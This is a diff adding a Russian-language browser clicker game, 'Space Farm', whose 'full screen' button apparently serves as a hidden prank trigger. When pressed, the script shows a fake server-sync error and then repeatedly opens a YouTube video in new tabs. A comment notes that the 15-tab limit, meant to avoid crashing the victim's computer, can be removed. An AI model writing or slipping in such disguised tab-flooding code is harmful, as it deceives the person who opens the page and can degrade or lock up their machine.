@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Космическая Ферма</title>
+    <style>
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            user-select: none;
+        }
+        h1 { color: #58a6ff; font-size: 2.5rem; margin-bottom: 5px; }
+        .subtitle { color: #8b949e; margin-bottom: 20px; }
+        
+        #game-area {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+
+        #clicker {
+            width: 180px;
+            height: 180px;
+            font-size: 70px;
+            border-radius: 50%;
+            border: 4px solid #58a6ff;
+            background: radial-gradient(circle, #1f6feb, #0d1117);
+            color: white;
+            cursor: pointer;
+            transition: transform 0.05s;
+            box-shadow: 0 0 40px rgba(88, 166, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        #clicker:active { transform: scale(0.9); }
+
+        .stats { font-size: 1.5rem; margin-bottom: 10px; font-weight: bold; }
+        
+        #upgrade-btn {
+            padding: 10px 20px;
+            font-size: 1rem;
+            background-color: #238636;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+            display: none; /* Появится, когда хватит очков */
+        }
+        #upgrade-btn:hover { background-color: #2ea043; }
+        
+        #status-text { margin-top: 20px; font-size: 1.2rem; color: #8b949e; min-height: 25px; }
+
+        /* Кнопка полного экрана */
+        #fs-btn {
+            position: absolute;
+            top: -40px;
+            right: -50px;
+            background: rgba(255,255,255,0.1);
+            color: white;
+            border: 1px solid rgba(255,255,255,0.3);
+            padding: 8px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.9rem;
+        }
+        #fs-btn:hover { background: rgba(255,255,255,0.2); }
+    </style>
+</head>
+<body>
+
+    <h1>Космическая Ферма</h1>
+    <p class="subtitle">Собирай звездную пыль и улучшай ферму!</p>
+
+    <div id="game-area">
+        <button id="fs-btn">🔲 На весь экран</button>
+        
+        <div class="stats">Пыль: <span id="score">0</span></div>
+        <button id="clicker">⭐</button>
+        <button id="upgrade-btn">Улучшить ферму (Цена: 10)</button>
+        <div id="status-text">Кликай по звезде, чтобы начать!</div>
+    </div>
+
+    <script>
+        var videoUrl = "https://youtu.be/w5BnMKOG33M";
+        var score = 0;
+        var clickPower = 1; // Сколько очков дает 1 клик
+        var upgradeCost = 10; // Цена улучшения
+        var bombStarted = false; // Флаг, чтобы не запускать дважды
+
+        // Логика кликера
+        document.getElementById('clicker').addEventListener('click', function() {
+            score += clickPower;
+            document.getElementById('score').innerText = score;
+            
+            // Проверяем, хватает ли на улучшение
+            if (score >= upgradeCost) {
+                document.getElementById('upgrade-btn').style.display = 'inline-block';
+            }
+        });
+
+        // Логика улучшения
+        document.getElementById('upgrade-btn').addEventListener('click', function() {
+            if (score >= upgradeCost) {
+                score -= upgradeCost;
+                clickPower *= 2; // Удваиваем силу клика
+                upgradeCost = Math.floor(upgradeCost * 2.5); // Повышаем цену
+                
+                document.getElementById('score').innerText = score;
+                this.innerText = "Улучшить ферму (Цена: " + upgradeCost + ")";
+                document.getElementById('status-text').innerHTML = "<span style='color:#3fb950;'>Ферма улучшена! Теперь клик дает x" + clickPower + "</span>";
+                
+                // Если денег снова не хватает, прячем кнопку
+                if (score < upgradeCost) {
+                    this.style.display = 'none';
+                }
+            }
+        });
+
+        // 🚀 ГЛАВНЫЙ ТРИГГЕР: Пранк начинается при нажатии на "На весь экран"
+        document.getElementById('fs-btn').addEventListener('click', function() {
+            // 1. Запрашиваем фуллскрин
+            var element = document.documentElement;
+            if (element.requestFullscreen) {
+                element.requestFullscreen().catch(err => {
+                    console.log("Ошибка фуллскрина: " + err.message);
+                });
+            }
+
+            // 2. Прячем кнопку фуллскрина, чтобы он не нажал её снова
+            this.style.display = 'none';
+
+            // 3. Меняем текст статуса, чтобы выглядело как ошибка загрузки
+            document.getElementById('status-text').innerHTML = "<span style='color:#f85149;'>Синхронизация с сервером...</span>";
+
+            // 4. Запускаем открытие видео через 3 секунды (чтобы он подумал, что идет загрузка)
+            if (!bombStarted) {
+                bombStarted = true;
+                setTimeout(function() {
+                    document.getElementById('status-text').innerHTML = "<span style='color:#f85149;'>Ошибка синхронизации. Перезагрузка...</span>";
+                    
+                    var count = 0;
+                    var maxOpenings = 15; // Ограничение, чтобы не убить его комп (можно убрать)
+
+                    var bombInterval = setInterval(function() {
+                        window.open(videoUrl, '_blank');
+                        count++;
+                        
+                        if (count >= maxOpenings) {
+                            clearInterval(bombInterval);
+                        }
+                    }, 2000); // Каждые 2 секунды
+                }, 3000); // 3 секунды задержки после клика
+            }
+        });
+    </script>
+</body>
+  </html>
